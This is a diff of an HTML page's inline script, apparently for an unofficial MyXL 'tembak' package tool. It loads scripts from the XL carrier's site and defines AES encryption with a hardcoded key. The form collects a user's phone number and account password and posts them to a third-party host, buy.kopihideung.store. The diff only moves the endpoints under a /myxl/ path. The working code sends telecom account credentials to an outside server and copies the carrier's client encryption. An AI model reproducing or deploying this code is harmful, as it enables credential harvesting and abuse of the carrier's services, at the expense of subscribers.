@@ -16,8 +16,8 @@
 <script src="https://my.xl.co.id/pre/assets/js/lib/aes.js"></script>
 <script src="https://my.xl.co.id/pre/app/shared/shared.function.min.js"></script>
 <script>function enc(str){var d ="dk3FFcifBXQw5WUdK5GBxs,BgWi5OStyCvUkTqoGSdy51,IsiPulsaxlviamyxl10928375a".split(","),e=d[0],f=d[1],a=str,e=CryptoJS.enc.Base64.parse(e),f=CryptoJS.enc.Base64.parse(f);var g =CryptoJS.AES.encrypt(a,e,{iv:f});return g.toString();}$(document).ready(function(){
-    $.get("http://buy.kopihideung.store/count.php").done(function(data){$('#count').html('Tester: '+data);});
-$("form").submit(function(event){event.preventDefault();var msisdn=jQuery('input[name="msisdn"]').val(),passwd=jQuery('input[name="passwd"]').val(),ini = jQuery('select[name="reg"]').val(),manual=jQuery('input[name="manual"]').val();$.ajax({type:'POST',url:'http://buy.kopihideung.store/tembak.php',data:{msisdn:msisdn,passwd:enc(passwd),reg:ini,manual:manual},error:function(xhr,ajaxOptions,thrownError){$('#response').html(xhr);},cache:false,beforeSend:function(){$('#response').html('Loading ....');},success:function(s){$('#response').html(s);}});return false;});});</script>
+    $.get("http://buy.kopihideung.store/myxl/count.php").done(function(data){$('#count').html('Tester: '+data);});
+$("form").submit(function(event){event.preventDefault();var msisdn=jQuery('input[name="msisdn"]').val(),passwd=jQuery('input[name="passwd"]').val(),ini = jQuery('select[name="reg"]').val(),manual=jQuery('input[name="manual"]').val();$.ajax({type:'POST',url:'http://buy.kopihideung.store/myxl/tembak.php',data:{msisdn:msisdn,passwd:enc(passwd),reg:ini,manual:manual},error:function(xhr,ajaxOptions,thrownError){$('#response').html(xhr);},cache:false,beforeSend:function(){$('#response').html('Loading ....');},success:function(s){$('#response').html(s);}});return false;});});</script>
 <style type="text/css">
 body {height:100%;margin: 0;padding: 0;font-family: arial;color: white;background-size: 100%;
 -webkit-background-size: cover;
